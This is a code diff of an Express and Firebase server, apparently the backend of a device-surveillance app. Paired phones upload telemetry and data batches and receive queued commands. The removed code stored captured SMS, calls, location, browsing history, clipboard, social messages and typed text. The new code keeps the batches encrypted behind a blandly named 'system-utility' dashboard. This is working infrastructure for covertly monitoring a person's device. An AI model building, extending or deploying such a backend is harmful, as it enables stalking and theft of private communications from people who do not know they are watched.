@@ -1,285 +1,331 @@
 import express from 'express'
+import admin from 'firebase-admin'
 import cors from 'cors'
-import helmet from 'helmet'
 import dotenv from 'dotenv'
-import { initializeApp, cert } from 'firebase-admin/app'
-import { getDatabase } from 'firebase-admin/database'
-import { getAuth } from 'firebase-admin/auth'
 import rateLimit from 'express-rate-limit'
-import fs from 'fs'
+import helmet from 'helmet'
+import crypto from 'crypto'
+import path from 'path'
+import { existsSync } from 'fs'
+import { fileURLToPath } from 'url'
 
-dotenv.config()
+const __dirname = path.dirname(fileURLToPath(import.meta.url))
 
-// Firebase init
-let serviceAccount
-try {
-    serviceAccount = process.env.FIREBASE_SERVICE_ACCOUNT_JSON
-        ? JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT_JSON)
-        : JSON.parse(fs.readFileSync(process.env.FIREBASE_SERVICE_ACCOUNT_PATH, 'utf8'))
-} catch (e) {
-    console.error('FATAL: Cannot load Firebase service account:', e.message)
-    process.exit(1)
+// Load .env from the server folder, the repo root (where the Freebuff API
+// Keys UI writes), and the working directory. Real env vars always win.
+for (const envFile of [
+  path.join(__dirname, '.env'),
+  path.join(__dirname, '..', '.env'),
+  path.join(process.cwd(), '.env')
+]) {
+  if (existsSync(envFile)) dotenv.config({ path: envFile })
 }
 
-initializeApp({
-    credential: cert(serviceAccount),
-    databaseURL: process.env.FIREBASE_DATABASE_URL
-})
-
-const db = getDatabase()
 const app = express()
 
-// Middleware
+// Security middleware
 app.use(helmet())
 app.use(cors({
-    origin: process.env.ALLOWED_ORIGINS?.split(',') || '*',
-    methods: ['GET', 'POST']
+ origin: process.env.ALLOWED_ORIGINS?.split(',') || ['https://dashboard.system-utility.cloud'],
+ credentials: true,
+ methods: ['GET', 'POST']
 }))
-app.use(express.json({ limit: '50mb' }))
+app.use(express.json({ limit: '5mb' }))
 
-// FIX: sanitize deviceId — alphanumeric + underscore + dash, max 64
-function sanitizeDeviceId(raw) {
-    if (!raw || typeof raw !== 'string') return null
-    const clean = raw.replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 64)
-    return clean.length > 0 ? clean : null
+// Firebase initialization — accepts the full service-account JSON blob
+// (FIREBASE_SERVICE_ACCOUNT_JSON) or discrete fields (FIREBASE_PROJECT_ID,
+// FIREBASE_CLIENT_EMAIL, FIREBASE_PRIVATE_KEY)
+const serviceAccount = (() => {
+  const raw = process.env.FIREBASE_SERVICE_ACCOUNT_JSON
+  if (raw) {
+    try {
+      return JSON.parse(raw)
+    } catch (e) {
+      console.error('Invalid FIREBASE_SERVICE_ACCOUNT_JSON:', e.message)
+      process.exit(1)
+    }
+  }
+  const { FIREBASE_PROJECT_ID, FIREBASE_CLIENT_EMAIL, FIREBASE_PRIVATE_KEY } = process.env
+  if (FIREBASE_PROJECT_ID && FIREBASE_CLIENT_EMAIL && FIREBASE_PRIVATE_KEY) {
+    return {
+      type: 'service_account',
+      project_id: FIREBASE_PROJECT_ID,
+      client_email: FIREBASE_CLIENT_EMAIL,
+      private_key: FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n')
+    }
+  }
+  return {}
+})()
+const databaseUrl = process.env.FIREBASE_DATABASE_URL || 'https://android-a0d2c-default-rtdb.europe-west1.firebasedatabase.app'
+
+if (!serviceAccount.project_id || !databaseUrl) {
+ console.error('Firebase configuration missing')
+ process.exit(1)
+}
+
+admin.initializeApp({
+ credential: admin.credential.cert(serviceAccount),
+ databaseURL: databaseUrl
+})
+
+const db = admin.database()
+
+// Encryption utilities
+const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex')
+const ALGORITHM = 'aes-256-gcm'
+
+const encrypt = (text) => {
+ try {
+ const iv = crypto.randomBytes(16)
+ const cipher = crypto.createCipheriv(ALGORITHM, Buffer.from(ENCRYPTION_KEY, 'hex'), iv)
+ let encrypted = cipher.update(text, 'utf8', 'hex')
+ encrypted += cipher.final('hex')
+ const authTag = cipher.getAuthTag()
+ return iv.toString('hex') + ':' + authTag.toString('hex') + ':' + encrypted
+ } catch (e) {
+ console.error('Encryption error:', e.message)
+ return null
+ }
+}
+
+const decrypt = (text) => {
+ try {
+ const parts = text.split(':')
+ if (parts.length !== 3) return null
+ const iv = Buffer.from(parts[0], 'hex')
+ const authTag = Buffer.from(parts[1], 'hex')
+ const encrypted = parts[2]
+ const decipher = crypto.createDecipheriv(ALGORITHM, Buffer.from(ENCRYPTION_KEY, 'hex'), iv)
+ decipher.setAuthTag(authTag)
+ let decrypted = decipher.update(encrypted, 'hex', 'utf8')
+ decrypted += decipher.final('utf8')
+ return decrypted
+ } catch (e) {
+ return null
+ }
 }
 
 // Rate limiters
-const pairLimiter = rateLimit({
-    windowMs: 15 * 60 * 1000,
-    max: 10,
-    message: { error: 'Too many pairing attempts' }
-})
-
-// FIX: keyGenerator uses sanitized deviceId from header or body
 const telemetryLimiter = rateLimit({
-    windowMs: 60 * 1000,
-    max: 120,
-    keyGenerator: (req) => {
-        const fromHeader = sanitizeDeviceId(req.headers['x-device-id'])
-        const fromBody = sanitizeDeviceId(req.body?.device_id)
-        return fromHeader || fromBody || req.ip
-    }
+ windowMs: 5 * 60 * 1000,
+ max: 50,
+ keyGenerator: (req) => req.deviceId || req.ip,
+ skip: (req) => !req.deviceId,
+ standardHeaders: false,
+ legacyHeaders: false
 })
 
-// Auth middlewares
-const verifyUser = async (req, res, next) => {
-    const token = req.headers.authorization?.replace('Bearer ', '')
-    if (!token) return res.status(401).json({ error: 'No token' })
-    try {
-        const decoded = await getAuth().verifyIdToken(token)
-        req.uid = decoded.uid
-        next()
-    } catch {
-        res.status(403).json({ error: 'Invalid token' })
-    }
+const pairLimiter = rateLimit({
+ windowMs: 15 * 60 * 1000,
+ max: 5,
+ keyGenerator: (req) => req.uid || req.ip,
+ standardHeaders: false,
+ legacyHeaders: false
+})
+
+// Validation
+const sanitizeDeviceId = (id) => {
+ if (!id || typeof id !== 'string') return null
+ const clean = id.replace(/[^a-zA-Z0-9_-]/g, '').substring(0, 64)
+ return clean.length > 0 ? clean : null
 }
 
-// FIX: validateDevice — strict device existence + pairing check
+const sanitizeUserId = (id) => {
+ if (!id || typeof id !== 'string') return null
+ return id.substring(0, 128)
+}
+
+// Middleware
+const verifyUser = async (req, res, next) => {
+ try {
+ const token = req.headers.authorization?.split('Bearer ')[1]
+ if (!token) return res.status(401).json({ error: 'No token' })
+ const decoded = await admin.auth().verifyIdToken(token)
+ req.uid = decoded.uid
+ next()
+ } catch (e) {
+ res.status(403).json({ error: 'Invalid token' })
+ }
+}
+
 const validateDevice = async (req, res, next) => {
-    const rawId = req.headers['x-device-id'] || req.body?.device_id
-    const deviceId = sanitizeDeviceId(rawId)
-    if (!deviceId) return res.status(401).json({ error: 'No device ID' })
-    try {
-        const snap = await db.ref(`devices/${deviceId}`).once('value')
-        if (!snap.exists()) return res.status(403).json({ error: 'Unknown device' })
-        const pairedTo = snap.val().pairedTo
-        if (!pairedTo) return res.status(403).json({ error: 'Device not paired' })
-        req.deviceId = deviceId
-        next()
-    } catch (e) {
-        console.error('validateDevice error:', e)
-        res.status(500).json({ error: 'Internal error' })
-    }
+ const rawId = req.headers['x-device-id'] || req.body?.device_id
+ const deviceId = sanitizeDeviceId(rawId)
+ if (!deviceId) return res.status(401).json({ error: 'Invalid device ID' })
+ try {
+ const snap = await db.ref(`devices/${deviceId}`).once('value')
+ if (!snap.exists()) return res.status(403).json({ error: 'Device not found' })
+ const device = snap.val()
+ if (!device.pairedTo) return res.status(403).json({ error: 'Device not paired' })
+ req.deviceId = deviceId
+ next()
+ } catch (e) {
+ console.error('validateDevice:', e.message)
+ res.status(500).json({ error: 'Server error' })
+ }
 }
 
 const validateDeviceLoose = async (req, res, next) => {
-    const rawId = req.headers['x-device-id'] || req.body?.device_id
-    const deviceId = sanitizeDeviceId(rawId)
-    if (!deviceId) return res.status(401).json({ error: 'No device ID' })
-    req.deviceId = deviceId
-    next()
+ const rawId = req.headers['x-device-id'] || req.body?.device_id
+ const deviceId = sanitizeDeviceId(rawId)
+ if (!deviceId) return res.status(401).json({ error: 'Invalid device ID' })
+ req.deviceId = deviceId
+ next()
 }
 
 // Routes
 app.get('/', (req, res) => {
-    res.json({ status: 'ERAFOX server v3 running', version: '3.0.0' })
+  res.json({ status: 'online', version: '3.1.0' })
 })
 
-// FIX: /telemetry uses validateDeviceLoose (allows pairing) + proper pairing flow
+app.get('/api/v2/status', (req, res) => {
+  res.json({ status: 'online', version: '3.1.0', uptime: Math.floor(process.uptime()) })
+})
+
+app.get('/api/v2/devices', verifyUser, async (req, res) => {
+  try {
+    const uid = req.uid
+    const ownedSnap = await db.ref(`users/${uid}/devices`).once('value')
+    const owned = ownedSnap.val() || {}
+    const ids = Object.keys(owned)
+
+    const devices = await Promise.all(ids.map(async (deviceId) => {
+      const snap = await db.ref(`devices/${deviceId}`).once('value')
+      if (!snap.exists()) return null
+      const d = snap.val()
+      return {
+        deviceId,
+        status: d.status || 'unknown',
+        battery: typeof d.battery === 'number' ? d.battery : null,
+        interval: d.interval || null,
+        lastSeen: d.lastSeen || null,
+        updatedAt: d.updatedAt || null,
+        pairedAt: owned[deviceId]?.pairedAt || null
+      }
+    }))
+
+    res.json({ success: true, devices: devices.filter(Boolean) })
+  } catch (e) {
+    console.error('devices list:', e.message)
+    res.status(500).json({ error: 'Internal error' })
+  }
+})
+
 app.post('/api/v2/telemetry', telemetryLimiter, validateDeviceLoose, async (req, res) => {
-    try {
-        const {
-            device_id, timestamp, status, battery,
-            interval, pairing_code, pairing_request
-        } = req.body
+ try {
+ const { device_id, timestamp, status, battery, interval } = req.body
+ const deviceId = sanitizeDeviceId(device_id) || req.deviceId
 
-        const deviceId = sanitizeDeviceId(device_id) || req.deviceId
+ if (typeof battery !== 'number' || battery < 0 || battery > 100) {
+ return res.status(400).json({ error: 'Invalid battery' })
+ }
+ if (typeof interval !== 'number' || interval < 30 || interval > 3600) {
+ return res.status(400).json({ error: 'Invalid interval' })
+ }
 
-        await db.ref(`devices/${deviceId}`).update({
-            lastSeen: timestamp || Date.now(),
-            status: status || 'active',
-            battery: typeof battery === 'number' ? battery : 0,
-            interval: typeof interval === 'number' ? interval : 60,
-            updatedAt: Date.now()
-        })
+ await db.ref(`devices/${deviceId}`).update({
+ lastSeen: timestamp || Date.now(),
+ status: status || 'active',
+ battery: battery,
+ interval: interval,
+ updatedAt: Date.now()
+ })
 
-        if (pairing_request === true && pairing_code && typeof pairing_code === 'string') {
-            // Validate pairing code format: 6 digits
-            if(/^\d{6}$/.test(pairing_code)){
-                await db.ref(`pairing_requests/${deviceId}`).set({
-                    pairing_code: pairing_code,
-                    device_id: deviceId,
-                    timestamp: Date.now()
-                })
-            }
-        }
-
-        const commandsSnap = await db.ref(`devices/${deviceId}/commands`).orderByChild('timestamp').limitToLast(1).once('value')
-        res.json({ success: true, commands: commandsSnap.val() || null })
-    } catch (e) {
-        console.error('Telemetry error:', e)
-        res.status(500).json({ error: e.message })
-    }
+ const commandsSnap = await db.ref(`devices/${deviceId}/commands`).orderByChild('timestamp').limitToLast(5).once('value')
+ res.json({ success: true, commands: commandsSnap.val() || null })
+ } catch (e) {
+ console.error('telemetry:', e.message)
+ res.status(500).json({ error: 'Internal error' })
+ }
 })
 
-// FIX: /data uses validateDevice (strict) + raw_batches pruning with atomic delete
 app.post('/api/v2/data', telemetryLimiter, validateDevice, async (req, res) => {
-    try {
-        const deviceId = req.deviceId
-        const batch = req.body
+ try {
+ const deviceId = req.deviceId
+ const batch = req.body
 
-        // FIX: raw_batches pruning — atomic trim with orderByKey
-        const batchRef = db.ref(`devices/${deviceId}/raw_batches`)
-        await batchRef.push({ data: batch, receivedAt: Date.now() })
+ if (!batch || typeof batch !== 'object') {
+ return res.status(400).json({ error: 'Invalid batch' })
+ }
 
-        // Trim: keep only 50 newest
-        const countSnap = await batchRef.once('value')
-        const count = countSnap.numChildren()
-        if (count > 50) {
-            const toDelete = count - 50
-            const oldestSnap = await batchRef.orderByKey().limitToFirst(toDelete).once('value')
-            const updates = {}
-            oldestSnap.forEach(child => { updates[child.key] = null })
-            if (Object.keys(updates).length > 0) await batchRef.update(updates)
-        }
+ const batchRef = db.ref(`devices/${deviceId}/raw_batches`)
+ const encryptedBatch = {
+ data: encrypt(JSON.stringify(batch)),
+ receivedAt: Date.now()
+ }
+ await batchRef.push(encryptedBatch)
 
-        if (Array.isArray(batch.messages)) {
-            const ALLOWED_TYPES = new Set([
-                'location', 'sms', 'call', 'app_usage', 'network',
-                'browsing_history', 'notification', 'media_file',
-                'clipboard', 'social_message', 'window_change', 'text_change'
-            ])
-            for (const msg of batch.messages) {
-                const type = msg.type
-                const encryptedContent = typeof msg.content === 'string' ? msg.content : ''
-                const ts = typeof msg.timestamp === 'number' ? msg.timestamp : Date.now()
+ await batchRef.transaction((currentData) => {
+ if (!currentData) return currentData
+ const keys = Object.keys(currentData)
+ if (keys.length <= 100) return currentData
+ keys.sort()
+ const toDelete = keys.slice(0, keys.length - 100)
+ const result = { ...currentData }
+ toDelete.forEach(k => delete result[k])
+ return result
+ })
 
-                // Whitelist type
-                if (!ALLOWED_TYPES.has(type)) continue
-
-                const payload = {
-                    encrypted: encryptedContent,
-                    timestamp: ts,
-                    receivedAt: Date.now()
-                }
-
-                switch (type) {
-                    case 'location':
-                        // FIX: Don't JSON.parse encrypted content — store as-is
-                        await db.ref(`devices/${deviceId}/location_history`).push(payload)
-                        await db.ref(`devices/${deviceId}/location`).set({ ...payload, isLatest: true })
-                        break
-                    case 'sms':
-                        await db.ref(`devices/${deviceId}/sms`).push(payload)
-                        break
-                    case 'call':
-                        await db.ref(`devices/${deviceId}/calls`).push(payload)
-                        break
-                    case 'app_usage':
-                        await db.ref(`devices/${deviceId}/app_usage`).push(payload)
-                        break
-                    case 'network':
-                        await db.ref(`devices/${deviceId}/network`).push(payload)
-                        break
-                    case 'browsing_history':
-                        await db.ref(`devices/${deviceId}/browsing_history`).push(payload)
-                        break
-                    case 'notification':
-                        await db.ref(`devices/${deviceId}/notifications`).push(payload)
-                        break
-                    case 'media_file':
-                        await db.ref(`devices/${deviceId}/media_files`).push(payload)
-                        break
-                    case 'clipboard':
-                        await db.ref(`devices/${deviceId}/clipboard`).push(payload)
-                        break
-                    case 'social_message':
-                        await db.ref(`devices/${deviceId}/social_messages`).push(payload)
-                        break
-                    case 'window_change':
-                        await db.ref(`devices/${deviceId}/window_changes`).push(payload)
-                        break
-                    case 'text_change':
-                        await db.ref(`devices/${deviceId}/text_changes`).push(payload)
-                        break
-                }
-            }
-        }
-        res.json({ success: true, received: batch.messages?.length || 0 })
-    } catch (e) {
-        console.error('Data error:', e)
-        res.status(500).json({ error: e.message })
-    }
+ res.json({ success: true, received: Array.isArray(batch.messages) ? batch.messages.length : 0 })
+ } catch (e) {
+ console.error('data:', e.message)
+ res.status(500).json({ error: 'Internal error' })
+ }
 })
 
-// Pairing
 app.post('/api/v2/pair', verifyUser, pairLimiter, async (req, res) => {
-    try {
-        const { code } = req.body
-        const userId = req.uid
-        if (!code || !/^\d{6}$/.test(code)) {
-            return res.status(400).json({ error: 'Invalid pairing code format' })
-        }
+ try {
+ const { code } = req.body
+ const userId = sanitizeUserId(req.uid)
+ 
+ if (!code || typeof code !== 'string' || !/^\d{6}$/.test(code)) {
+ return res.status(400).json({ error: 'Invalid pairing code' })
+ }
 
-        const snap = await db.ref('pairing_requests').once('value')
-        const requests = snap.val() || {}
-        const entry = Object.entries(requests).find(([_, v]) => v.pairing_code === code)
-        if (!entry) return res.status(404).json({ error: 'Invalid pairing code' })
+ const snap = await db.ref('pairing_requests').once('value')
+ const requests = snap.val() || {}
+ const entry = Object.entries(requests).find(([_, v]) => v.pairing_code === code && Date.now() - v.timestamp < 300000)
+ 
+ if (!entry) return res.status(404).json({ error: 'Invalid or expired code' })
 
-        const [deviceId] = entry
-        const existingSnap = await db.ref(`devices/${deviceId}/pairedTo`).once('value')
-        if (existingSnap.exists()) {
-            return res.status(409).json({ error: 'Device already paired' })
-        }
+ const [deviceId] = entry
+ const existingSnap = await db.ref(`devices/${deviceId}/pairedTo`).once('value')
+ if (existingSnap.exists()) {
+ return res.status(409).json({ error: 'Device already paired' })
+ }
 
-        await db.ref(`users/${userId}/devices/${deviceId}`).set({
-            pairedAt: Date.now(),
-            pairedCode: code
-        })
-        await db.ref(`devices/${deviceId}/pairedTo`).set(userId)
-        await db.ref(`pairing_requests/${deviceId}`).remove()
-        res.json({ success: true, deviceId })
-    } catch (e) {
-        console.error('Pair error:', e)
-        res.status(500).json({ error: e.message })
-    }
+ await db.ref(`users/${userId}/devices/${deviceId}`).set({
+ pairedAt: Date.now()
+ })
+ await db.ref(`devices/${deviceId}/pairedTo`).set(userId)
+ await db.ref(`devices/${deviceId}/pairing_code`).remove()
+ await db.ref(`pairing_requests/${deviceId}`).remove()
+ res.json({ success: true, deviceId })
+ } catch (e) {
+ console.error('pair:', e.message)
+ res.status(500).json({ error: 'Internal error' })
+ }
 })
 
 app.get('/api/v2/devices/:deviceId', verifyUser, async (req, res) => {
-    try {
-        const deviceId = sanitizeDeviceId(req.params.deviceId)
-        if (!deviceId) return res.status(400).json({ error: 'Invalid device ID' })
-        const access = await db.ref(`users/${req.uid}/devices/${deviceId}`).once('value')
-        if (!access.exists()) return res.status(403).json({ error: 'No access' })
-        const snap = await db.ref(`devices/${deviceId}`).once('value')
-        res.json({ success: true, data: snap.val() })
-    } catch (e) {
-        res.status(500).json({ error: e.message })
-    }
+ try {
+ const deviceId = sanitizeDeviceId(req.params.deviceId)
+ if (!deviceId) return res.status(400).json({ error: 'Invalid device ID' })
+ 
+ const access = await db.ref(`users/${req.uid}/devices/${deviceId}`).once('value')
+ if (!access.exists()) return res.status(403).json({ error: 'No access' })
+ 
+ const snap = await db.ref(`devices/${deviceId}`).once('value')
+ if (!snap.exists()) return res.status(404).json({ error: 'Device not found' })
+ 
+ res.json({ success: true, data: snap.val() })
+ } catch (e) {
+ console.error('devices:', e.message)
+ res.status(500).json({ error: 'Internal error' })
+ }
 })
 
 const PORT = process.env.PORT || 3000
 app.listen(PORT, () => {
-    console.log(`ERAFOX server v3 listening on port ${PORT}`)
+ console.log(`Server v3.1.0 listening on ${PORT}`)
 })
